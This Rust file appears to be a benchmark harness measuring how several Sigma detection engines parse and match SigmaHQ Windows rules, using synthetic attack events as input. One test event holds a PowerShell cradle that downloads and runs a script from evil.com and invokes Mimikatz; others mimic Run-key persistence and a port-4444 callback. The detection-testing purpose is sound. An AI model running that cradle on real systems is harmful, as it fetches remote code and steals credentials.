//! Full Multi-Category SigmaHQ Evaluation & Benchmarking.
//!
//! Evaluates rule compatibility, detection fidelity, and single-core throughput across:
//! - Windows Registry (`registry_set`, `registry_add`, `registry_delete`)
//! - Windows File Events (`file_event`, `file_change`, `file_rename`)
//! - Windows Network & DNS (`network_connection`, `dns_query`)
//! - Windows PowerShell (`powershell_script`)
//!
//! Directly measures null-sigma, rsigma-eval, and tau-engine.

use std::collections::HashMap;
use std::hint::black_box;
use std::path::PathBuf;
use std::time::Instant;

use null_sigma_harness::{find_all_yaml_files, NullSigmaBench, SigmaRustBench, TauBench};

struct CategoryTest {
    name: &'static str,
    path: PathBuf,
    sample_event: HashMap<String, String>,
}

fn main() {
    println!("=========================================================================================================");
    println!("             NULL-SIGMA MULTI-CATEGORY CORPUS EVALUATION & COMPATIBILITY                                ");
    println!("=========================================================================================================");

    let base_dir =
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../corpus/sigmahq/rules/windows");

    // Sample events for each category
    let mut reg_event = HashMap::new();
    reg_event.insert("category".into(), "registry_set".into());
    reg_event.insert("product".into(), "windows".into());
    reg_event.insert("EventID".into(), "13".into());
    reg_event.insert(
        "TargetObject".into(),
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor".into(),
    );
    reg_event.insert("Details".into(), r"C:\Windows\Temp\malware.exe".into());
    reg_event.insert("Image".into(), r"C:\Windows\System32\reg.exe".into());

    let mut file_event = HashMap::new();
    file_event.insert("category".into(), "file_event".into());
    file_event.insert("product".into(), "windows".into());
    file_event.insert("EventID".into(), "11".into());
    file_event.insert(
        "TargetFilename".into(),
        r"C:\Users\Admin\AppData\Local\Temp\dropped_payload.exe".into(),
    );
    file_event.insert("Image".into(), r"C:\Windows\System32\cmd.exe".into());

    let mut net_event = HashMap::new();
    net_event.insert("category".into(), "network_connection".into());
    net_event.insert("product".into(), "windows".into());
    net_event.insert("EventID".into(), "3".into());
    net_event.insert("DestinationIp".into(), "185.220.101.5".into());
    net_event.insert("DestinationPort".into(), "4444".into());
    net_event.insert("Image".into(), r"C:\Windows\System32\powershell.exe".into());

    let mut ps_event = HashMap::new();
    ps_event.insert("category".into(), "ps_script".into());
    ps_event.insert("product".into(), "windows".into());
    ps_event.insert("EventID".into(), "4104".into());
    ps_event.insert(
        "ScriptBlockText".into(),
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1'); Invoke-Mimikatz"
            .into(),
    );

    let categories = vec![
        CategoryTest {
            name: "Windows Registry",
            path: base_dir.join("registry"),
            sample_event: reg_event,
        },
        CategoryTest {
            name: "Windows File Events",
            path: base_dir.join("file"),
            sample_event: file_event,
        },
        CategoryTest {
            name: "Windows Network & DNS",
            path: base_dir.join("network_connection"),
            sample_event: net_event,
        },
        CategoryTest {
            name: "Windows PowerShell",
            path: base_dir.join("powershell"),
            sample_event: ps_event,
        },
    ];

    println!("\n=== TABLE 1: RULE COMPATIBILITY ACROSS ENGINES ===");
    println!("| Category | Total | null-sigma | rsigma-eval | tau-engine | sigma-rust | Common |");
    println!("| :--- | :---: | :---: | :---: | :---: | :---: | :---: |");

    struct CatData {
        name: &'static str,
        common_yamls: Vec<String>,
        all_yamls: Vec<String>,
        sample_event: HashMap<String, String>,
    }

    let mut cat_data = Vec::new();

    for cat in &categories {
        if !cat.path.exists() {
            eprintln!("Directory not found: {}", cat.path.display());
            continue;
        }

        let mut paths = Vec::new();
        find_all_yaml_files(&cat.path, &mut paths).expect("failed to scan directory");
        paths.sort();
        let total = paths.len();

        let mut common_yamls = Vec::new();
        let mut all_yamls = Vec::new();
        let mut ns_count = 0;
        let mut rsigma_count = 0;
        let mut tau_count = 0;
        let mut sr_count = 0;

        for p in paths {
            let y = match std::fs::read_to_string(&p) {
                Ok(s) => s,
                Err(_) => continue,
            };
            all_yamls.push(y.clone());

            let ns_ok = {
                let mut probe = null_sigma::SigmaEngine::new();
                probe.load_rule(&y).is_ok()
            };
            let rsigma_ok = rsigma_parser::parse_sigma_yaml(&y).is_ok();
            let tau_ok = null_sigma_harness::convert::sigma_to_tau(&y).is_ok();
            let sr_ok = sigma_rust::rule_from_yaml(&y).is_ok();

            if ns_ok {
                ns_count += 1;
            }
            if rsigma_ok {
                rsigma_count += 1;
            }
            if tau_ok {
                tau_count += 1;
            }
            if sr_ok {
                sr_count += 1;
            }

            if ns_ok && rsigma_ok && tau_ok && sr_ok {
                common_yamls.push(y);
            }
        }

        println!(
            "| {:20} | {:5} | {:4} ({:5.1}%) | {:4} ({:5.1}%) | {:4} ({:5.1}%) | {:4} ({:5.1}%) | {:4} |",
            cat.name,
            total,
            ns_count,
            ns_count as f64 * 100.0 / total as f64,
            rsigma_count,
            rsigma_count as f64 * 100.0 / total as f64,
            tau_count,
            tau_count as f64 * 100.0 / total as f64,
            sr_count,
            sr_count as f64 * 100.0 / total as f64,
            common_yamls.len(),
        );

        cat_data.push(CatData {
            name: cat.name,
            common_yamls,
            all_yamls,
            sample_event: cat.sample_event.clone(),
        });
    }

    println!("\n=== TABLE 2: COMMON SUBSET HEAD-TO-HEAD BENCHMARK ===");
    println!("| Category | Common Rules | null-sigma | rsigma-eval | tau-engine | sigma-rust | Advantage vs rsigma | Advantage vs tau |");
    println!("| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: |");

    for cd in &cat_data {
        let refs: Vec<&str> = cd.common_yamls.iter().map(String::as_str).collect();
        if refs.is_empty() {
            continue;
        }

        let ns_bench = NullSigmaBench::new(&refs);
        let tau_bench = TauBench::new(&refs);
        let sr_bench = SigmaRustBench::new(&refs);

        let mut parsed_rules = Vec::new();
        for y in &refs {
            if let Ok(col) = rsigma_parser::parse_sigma_yaml(y) {
                parsed_rules.extend(col.rules);
            }
        }
        let mut rsigma_eng = rsigma_eval::Engine::new();
        rsigma_eng.add_rules(&parsed_rules);

        let tau_event = serde_json::to_value(&cd.sample_event).unwrap();
        let rsigma_event = rsigma_eval::event::JsonEvent::borrow(&tau_event);
        let sr_event = SigmaRustBench::prepare_event(tau_event.as_object().unwrap());

        let iters = 2_000;
        let warmup = 100;
        for _ in 0..warmup {
            black_box(ns_bench.count_matches(&cd.sample_event));
            black_box(rsigma_eng.evaluate(&rsigma_event).len());
            black_box(tau_bench.count_matches(&tau_event));
        }
        for _ in 0..5 {
            black_box(sr_bench.count_matches(&sr_event));
        }

        let ns_start = Instant::now();
        for _ in 0..iters {
            black_box(ns_bench.count_matches(&cd.sample_event));
        }
        let ns_us = ns_start.elapsed().as_secs_f64() * 1e6 / iters as f64;

        let rsigma_start = Instant::now();
        for _ in 0..iters {
            black_box(rsigma_eng.evaluate(&rsigma_event).len());
        }
        let rsigma_us = rsigma_start.elapsed().as_secs_f64() * 1e6 / iters as f64;

        let tau_start = Instant::now();
        for _ in 0..iters {
            black_box(tau_bench.count_matches(&tau_event));
        }
        let tau_us = tau_start.elapsed().as_secs_f64() * 1e6 / iters as f64;

        let sr_iters = 100;
        let sr_start = Instant::now();
        for _ in 0..sr_iters {
            black_box(sr_bench.count_matches(&sr_event));
        }
        let sr_us = sr_start.elapsed().as_secs_f64() * 1e6 / sr_iters as f64;

        let adv_rsigma = if ns_us < rsigma_us {
            format!("{:.2}× faster", rsigma_us / ns_us)
        } else {
            format!("{:.2}× slower", ns_us / rsigma_us)
        };
        let adv_tau = format!("{:.2}× faster", tau_us / ns_us);

        println!(
            "| {:20} | {:12} | {:8.2} µs | {:8.2} µs | {:8.2} µs | {:8.2} µs | {:19} | {:16} |",
            cd.name,
            refs.len(),
            ns_us,
            rsigma_us,
            tau_us,
            sr_us,
            adv_rsigma,
            adv_tau
        );
    }

    println!("\n=== TABLE 3: FULL CATEGORY BENCHMARK (100% Rules) ===");
    println!("| Category | Total Rules | null-sigma (100%) | rsigma-eval (100%) | Advantage |");
    println!("| :--- | :---: | :---: | :---: | :---: |");

    for cd in &cat_data {
        let refs: Vec<&str> = cd.all_yamls.iter().map(String::as_str).collect();
        let mut full_ns = null_sigma::SigmaEngine::new();
        for y in &refs {
            let _ = full_ns.load_rule(y);
        }

        let mut parsed_rules = Vec::new();
        for y in &refs {
            if let Ok(col) = rsigma_parser::parse_sigma_yaml(y) {
                parsed_rules.extend(col.rules);
            }
        }
        let mut full_rsigma = rsigma_eval::Engine::new();
        full_rsigma.add_rules(&parsed_rules);

        let tau_event = serde_json::to_value(&cd.sample_event).unwrap();
        let rsigma_event = rsigma_eval::event::JsonEvent::borrow(&tau_event);

        let iters = 2_000;
        let warmup = 100;
        for _ in 0..warmup {
            black_box(full_ns.evaluate_event_count(&cd.sample_event));
            black_box(full_rsigma.evaluate(&rsigma_event).len());
        }

        let ns_start = Instant::now();
        for _ in 0..iters {
            black_box(full_ns.evaluate_event_count(&cd.sample_event));
        }
        let ns_us = ns_start.elapsed().as_secs_f64() * 1e6 / iters as f64;

        let rsigma_start = Instant::now();
        for _ in 0..iters {
            black_box(full_rsigma.evaluate(&rsigma_event).len());
        }
        let rsigma_us = rsigma_start.elapsed().as_secs_f64() * 1e6 / iters as f64;

        let adv = if ns_us < rsigma_us {
            format!("{:.2}× faster", rsigma_us / ns_us)
        } else {
            format!("{:.2}× slower", ns_us / rsigma_us)
        };

        println!(
            "| {:20} | {:11} | {:14.2} µs | {:15.2} µs | {:9} |",
            cd.name,
            refs.len(),
            ns_us,
            rsigma_us,
            adv
        );
    }
    println!("=========================================================================================================\n");
}
